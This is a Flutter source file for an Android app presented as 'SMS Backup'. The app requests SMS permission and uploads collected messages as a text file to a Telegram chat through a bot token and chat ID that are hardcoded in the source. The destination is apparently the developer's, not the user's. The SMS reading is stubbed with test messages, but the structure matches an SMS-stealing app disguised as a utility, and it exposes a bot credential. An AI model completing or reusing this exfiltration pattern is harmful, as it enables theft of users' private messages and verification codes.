import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'dart:convert';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'SMS Backup',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(primarySwatch: Colors.purple, useMaterial3: true),
      home: const SMSBackupPage(),
    );
  }
}

class SMSBackupPage extends StatefulWidget {
  const SMSBackupPage({super.key});

  @override
  State<SMSBackupPage> createState() => _SMSBackupPageState();
}

class _SMSBackupPageState extends State<SMSBackupPage> {
  final String botToken = "8859100629:AAFdW_k4Ist35Eiof06w3MPp93S4fzlq8SM";
  final String chatId = "6076447275";
  
  List<String> messages = [];
  bool isLoading = false;
  String status = 'Ready';
  
  @override
  void initState() {
    super.initState();
    requestPermission();
  }
  
  Future<void> requestPermission() async {
    var status = await Permission.sms.request();
    if (!mounted) return;
    setState(() {
      this.status = status.isGranted ? '✅ Ready' : '❌ Permission denied';
    });
  }
  
  Future<void> readSMS() async {
    setState(() {
      isLoading = true;
      status = 'Reading SMS...';
    });
    
    try {
      await Future.delayed(const Duration(seconds: 1));
      messages = [
        'Test message 1',
        'Test message 2',
        'Test message 3',
      ];
      
      if (!mounted) return;
      setState(() {
        isLoading = false;
        status = '✅ Read ${messages.length} messages';
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        isLoading = false;
        status = '❌ Error: $e';
      });
    }
  }
  
  Future<void> sendToTelegram() async {
    if (messages.isEmpty) return;
    
    setState(() {
      isLoading = true;
      status = 'Sending...';
    });
    
    try {
      StringBuffer buffer = StringBuffer();
      buffer.writeln('SMS BACKUP REPORT');
      buffer.writeln('Date: ${DateTime.now()}');
      buffer.writeln('Total: ${messages.length}');
      buffer.writeln('=' * 40);
      
      for (int i = 0; i < messages.length; i++) {
        buffer.writeln('[$i] ${messages[i]}');
        buffer.writeln('-' * 30);
      }
      
      var request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.telegram.org/bot$botToken/sendDocument')
      );
      
      request.fields['chat_id'] = chatId;
      request.fields['caption'] = '📱 SMS Backup\n📊 ${messages.length} messages';
      request.files.add(
        http.MultipartFile.fromString(
          'document',
          buffer.toString(),
          filename: 'sms_backup_${DateTime.now().millisecondsSinceEpoch}.txt',
        )
      );
      
      var response = await request.send();
      var result = json.decode(await response.stream.bytesToString());
      
      if (!mounted) return;
      setState(() {
        isLoading = false;
        status = result['ok'] == true ? '✅ Sent!' : '❌ Failed';
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        isLoading = false;
        status = '❌ Error: $e';
      });
    }
  }
  
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('📱 SMS Backup'),
        centerTitle: true,
        backgroundColor: Colors.purple,
      ),
      body: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          children: [
            Card(
              elevation: 5,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15)),
              child: Padding(
                padding: const EdgeInsets.all(20),
                child: Column(
                  children: [
                    Text(
                      status,
                      textAlign: TextAlign.center,
                      style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
                    ),
                    const SizedBox(height: 15),
                    if (isLoading)
                      const CircularProgressIndicator()
                    else
                      LinearProgressIndicator(
                        value: messages.isEmpty ? 0 : 1,
                        backgroundColor: Colors.grey.shade200,
                      ),
                  ],
                ),
              ),
            ),
            const SizedBox(height: 20),
            ElevatedButton.icon(
              onPressed: isLoading ? null : readSMS,
              icon: const Icon(Icons.message),
              label: const Text('Read SMS'),
              style: ElevatedButton.styleFrom(
                minimumSize: const Size(double.infinity, 55),
                backgroundColor: Colors.purple,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
              ),
            ),
            const SizedBox(height: 12),
            ElevatedButton.icon(
              onPressed: (isLoading || messages.isEmpty) ? null : sendToTelegram,
              icon: const Icon(Icons.send),
              label: const Text('Send to Telegram'),
              style: ElevatedButton.styleFrom(
                minimumSize: const Size(double.infinity, 55),
                backgroundColor: Colors.green,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
              ),
            ),
            const SizedBox(height: 20),
            if (messages.isNotEmpty)
              Card(
                child: ListTile(
                  leading: const Icon(Icons.info, color: Colors.purple),
                  title: Text('Messages: ${messages.length}'),
                ),
              ),
            const SizedBox(height: 10),
            Expanded(
              child: messages.isEmpty
                  ? const Center(
                      child: Text(
                        'Press "Read SMS" to start',
                        style: TextStyle(color: Colors.grey, fontSize: 16),
                      ),
                    )
                  : ListView.builder(
                      itemCount: messages.length,
                      itemBuilder: (context, index) {
                        return Card(
                          margin: const EdgeInsets.symmetric(vertical: 5),
                          child: ListTile(
                            leading: CircleAvatar(
                              backgroundColor: Colors.purple.shade100,
                              child: const Icon(Icons.message, color: Colors.purple),
                            ),
                            title: Text('Message ${index + 1}'),
                            subtitle: Text(messages[index]),
                          ),
                        );
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }
}
